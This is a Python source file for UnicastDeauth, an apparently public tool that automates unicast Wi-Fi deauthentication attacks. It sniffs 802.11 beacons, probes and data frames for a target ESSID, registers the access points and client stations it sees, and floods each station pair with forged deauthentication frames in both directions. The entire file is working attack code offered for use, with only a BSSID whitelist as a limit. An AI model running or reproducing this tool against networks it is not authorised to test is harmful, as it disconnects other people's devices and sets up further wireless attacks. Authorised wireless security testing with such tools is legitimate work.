#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# offer targeting bssids instead of an essid
# add module docstring
# check for protected management frames

import sys
import argparse
from scapy.layers import dot11
from scapy.config import conf as scapy_conf
from scapy.sendrecv import sniff as scapy_sniff

BPF_DOT11_BEACON = 'wlan type mgt subtype beacon'
BPF_DOT11_PROBE_REQ = 'wlan type mgt subtype probe-req'
BPF_DOT11_PROBE_RESP = 'wlan type mgt subtype probe-resp'
BPF_DOT11_CONTROL =  'wlan type ctl'
BPF_DOT11_DATA = 'wlan type data'
DEAUTH_COUNT = 64

class MsgException(Exception):
    def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.exception = exception
        self.message = message
    
    def __str__(self):
        return f'[!] Error! {self.message}:\n    {self.exception}'

def bssids_whitelist_type(bssids_whitelist_string):
    '''comma-separated bssids whitelist parsing'''
    
    try:
        bssids_whitelist_set = set()
        for bssid in bssids_whitelist_string.split(','):
            bssids_whitelist_set.add(bssid.strip().lower())
    except Exception as e:
        raise MsgException(e, 'Comma-separated BSSIDs whitelist could not be processed')
    return bssids_whitelist_set

def panic(msg_exception):
    '''exception handling'''
    
    print(msg_exception, file = sys.stderr)

def print_info(message):
    '''additional info printing'''
    
    print(f'[!] Info: {message}', file = sys.stderr)

def is_unicast(bssid):
    '''bssid type checking'''
    
    try:
        unicast = not (int(bssid.split(':')[0], 16) & 0x1)
    except Exception as e:
        raise MsgException(e, 'BSSID could not be processed')
    return unicast

def get_src_dst_network(frame):
    '''frame control field parsing'''
    
    try:
        if frame.FCfield & 0x1:
            if not (frame.FCfield & 0x2):
                bssid_src = frame.addr2
                bssid_dst = frame.addr3
                bssid_network = frame.addr1
        else:
            bssid_dst = frame.addr1
            if frame.FCfield & 0x2:
                bssid_src = frame.addr3
                bssid_network = frame.addr2
            else:
                bssid_src = frame.addr2
                bssid_network = frame.addr3
    except Exception as e:
        raise MsgException(e, 'Frame Control field could not be processed')
    return bssid_src, bssid_dst, bssid_network

def register_ap(wifi_essid, bssid_ap, bssid_network, bssids_aps_dict):
    '''ap registration'''
    
    try:
        bssids_aps_dict.update({bssid_ap: bssid_network})
        print_info(
            f'AP detected for network {wifi_essid}'
            f'\n    access point = {bssid_ap}'
            f'\n    network      = {bssid_network}'
        )
    except Exception as e:
        raise MsgException(e, 'Detected access point could not be registered')

def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
    '''sta registration'''
    
    try:
        bssids_stas_dict.update({bssid_sta: bssid_ap})
        print_info(
            f'STA detected for network {wifi_essid}'
            f'\n    station      = {bssid_sta}'
            f'\n    access point = {bssid_ap}'
        )
    except Exception as e:
        raise MsgException(e, 'Detected station could not be registered')

def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network, deauth_waves):
    '''unicast deauthentication'''
    
    try:
        unicast_deauth_socket = scapy_conf.L2socket(iface = wifi_interface)
        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
        for i in range(deauth_waves):
            for i in range(DEAUTH_COUNT):
                unicast_deauth_socket.send(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7)
                )
            for i in range(DEAUTH_COUNT):
                unicast_deauth_socket.send(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7)
                )
        unicast_deauth_socket.close()
    except Exception as e:
        raise MsgException(e, 'Deauthentication frames could not be sent')

def sniffer_wrapper(wifi_interface, wifi_essid, deauth_waves, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
    def sniffer_handler(frame):
        '''sniffed frame processing'''
        
        try:
            bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
            if bssid_src and bssid_dst and bssid_network:
                
                # wlan type mgt subtype beacon or wlan type mgt subtype probe-resp
                if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
                    if (bssid_src not in bssids_whitelist) and (not bssids_aps_dict.get(bssid_src)):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                    register_ap(wifi_essid, bssid_src, bssid_network, bssids_aps_dict)
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                # wlan type mgt subtype probe-req
                elif frame.haslayer(dot11.Dot11ProbeReq):
                    if (bssid_dst not in bssids_whitelist) and is_unicast(bssid_dst) and (not bssids_aps_dict.get(bssid_dst)):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                    register_ap(wifi_essid, bssid_dst, bssid_network, bssids_aps_dict)
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                else:
                    if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                        register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
                        unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network, deauth_waves)
                    elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                        register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
                        unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network, deauth_waves)
        
        except Exception as e:
            raise MsgException(e, 'Sniffed frames could not be processed')
    return sniffer_handler

def main():
    '''main'''
    
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument(
            '-i',
            dest = 'wifi_interface',
            help = 'Wi-Fi interface',
            required = True,
        )
        parser.add_argument(
            '-e',
            dest = 'wifi_essid',
            help = 'Wi-Fi ESSID',
            required = True,
        )
        parser.add_argument(
            '-n',
            dest = 'deauth_waves',
            help = 'Number of deauthentication waves',
            required = False,
            type = int,
            default = 1,
        )
        parser.add_argument(
            '-wl',
            dest = 'bssids_whitelist',
            help = 'Comma-separated BSSIDs whitelist',
            required = False,
            type = bssids_whitelist_type,
            default = [],
        )
        args = parser.parse_args()
        bssids_aps_dict = {} # {ap bssid: network bssid}
        bssids_stas_dict = {} # {sta bssid: ap bssid}
        scapy_sniff(
            iface = args.wifi_interface,
            filter =
                BPF_DOT11_BEACON + ' or ' +
                BPF_DOT11_PROBE_REQ + ' or ' +
                BPF_DOT11_PROBE_RESP + ' or ' +
                BPF_DOT11_CONTROL + ' or ' +
                BPF_DOT11_DATA,
            prn = sniffer_wrapper(
                args.wifi_interface,
                args.wifi_essid,
                args.deauth_waves,
                args.bssids_whitelist,
                bssids_aps_dict,
                bssids_stas_dict,
            ),
        )
    except MsgException as msg_exception:
        panic(msg_exception)
    except Exception as e:
        panic(MsgException(e))

if __name__ == '__main__':
    main()
